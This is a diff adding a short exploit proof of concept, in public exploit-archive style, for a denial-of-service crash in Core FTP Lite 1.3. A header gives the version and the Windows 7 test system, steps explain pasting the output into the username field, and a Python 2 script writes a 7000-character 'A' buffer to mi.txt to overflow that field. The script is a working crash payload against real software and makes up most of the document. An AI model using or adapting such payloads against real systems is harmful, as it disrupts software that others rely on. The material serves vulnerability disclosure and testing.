@@ -1,0 +1,28 @@
+# Exploit Title : Core FTP Lite 1.3 - Denial of Service (PoC)
+# Exploit Author: Berat Isler
+# Date: 2020-02-20
+# Vendor Homepage: http://www.coreftp.com/
+# Software Link Download:http://tr.oldversion.com/windows/core-ftp-le-1-3cbuild1437
+# Version: Core FTP 1.3cBuild1437
+# Tested on : Windows 7 32-bit
+
+# First step , Run exploit script, it will generate a new file with the name "mi.txt"
+# Then start Core FTP application and find the "username" textbox.
+# After that pate the content of "mi.txt" in to the "username" field like this --> "AAAAAAAAA"
+# Don't need to click anything because application is already crash.
+
+This is the code :
+
+
+#!/usr/bin/python
+    
+b0f = "A" * 7000
+payload = b0f
+try:
+    f=open("mi.txt","w")
+    print "[+] Creating %s bytes payload generated .. .. .." %len(payload)
+    f.write(payload)
+    f.close()
+    print "[+] File created :) "
+except:
+    print "File cannot be created :(("
